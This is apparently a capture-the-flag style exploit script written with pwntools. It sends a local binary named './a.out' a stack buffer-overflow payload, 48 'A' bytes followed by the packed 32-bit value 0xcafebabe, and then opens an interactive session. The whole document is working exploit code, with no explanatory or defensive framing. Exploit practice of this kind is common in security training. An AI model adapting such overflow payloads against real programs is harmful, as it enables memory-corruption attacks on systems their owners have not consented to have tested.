from pwn import *

offset = 44 + 4
target_value = 0xcafebabe

payload = b'A' * offset + p32(target_value)

log.info(f"Using offset: {offset}")

p = process('./a.out')

p.sendline(payload)
p.interactive()